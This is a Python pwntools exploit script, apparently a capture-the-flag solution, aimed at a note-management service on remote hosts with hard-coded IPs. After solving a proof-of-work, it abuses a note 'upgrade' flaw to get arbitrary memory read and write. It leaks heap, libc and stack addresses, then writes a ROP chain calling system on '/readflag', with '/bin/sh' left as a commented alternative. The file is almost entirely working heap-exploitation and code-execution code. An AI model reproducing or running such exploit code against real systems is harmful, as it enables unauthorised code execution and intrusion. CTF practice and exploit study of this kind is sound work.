from pwn import *
from gmpy2 import mpz

# r = process("./pwn", env={"LD_PRELOAD":"./libc.so.6"})
r = remote("1.13.191.241", 11451)
# r = remote("43.154.211.24", 11451)
# r = remote("localhost", 11451)

a = r.recvline().strip().decode()
exp = int(a.split()[1].split('^')[-1][:-1])
mod = int(a.split()[3])
print(exp, mod)

ans = pow(mpz(2), pow(mpz(2), mpz(exp)), mpz(mod))
r.sendline(str(ans))
r.recvline()

def rec():
	return r.recvuntil("?")

def set_note(group, idx, data):
	rec()
	r.sendline("1")
	rec()
	r.sendline(str(group))
	rec()
	r.sendline(str(idx))
	rec()
	r.sendline(data)

def show_note(group, idx):
	rec()
	r.sendline("2")
	rec()
	r.sendline(str(group))
	rec()
	r.sendline(str(idx))

def upgrade_note(idx1, idx2):
	rec()
	r.sendline("3")
	rec()
	r.sendline(str(idx1))
	rec()
	r.sendline(str(idx2))

def write(addr, value):
	set_note(1, 0, p64(addr) + p64(len(value)+1) + p64(len(value)+1) + p64(0x0))
	set_note(0, 4, value)

def read(addr):
	set_note(1, 0, p64(addr) + p64(0x8) + p64(0x8) + p64(0x0))
	show_note(0, 4)
	r.recvline()
	return r.recv(8)

set_note(1, 1, "A"*0x5)
upgrade_note(4, 1)

show_note(1, 0)
r.recvline()
heap_leak = u64(r.recv(6) + "\x00"*2) + 0x7f0
print(hex(heap_leak))

set_note(0, 1, "A"*0x800)

libc_base = u64(read(heap_leak)[:6] + "\x00"*2) - 0x1d8c00
print(hex(libc_base))

# environ = libc_base + 0x221200
environ = libc_base + 0x1e0260

stack = u64(read(environ)[:6] + "\x00"*2) - 0x120
print(hex(stack))

bss = libc_base + 0x0000000001DAE60
# write(bss, "/bin/sh\x00")
write(bss, "/readflag\x00")

# pop_rdi = libc_base + 0x000000000002a3e5 # pop rdi ; ret
pop_rdi = libc_base + 0x0000000000023835 # pop rdi ; ret
#system = libc_base + 0x50d60
system = libc_base + 0x493d0

ropchain = p64(pop_rdi + 1) + p64(pop_rdi) + p64(bss) + p64(system)
write(stack, ropchain)

rec()
r.sendline("4")

r.interactive()
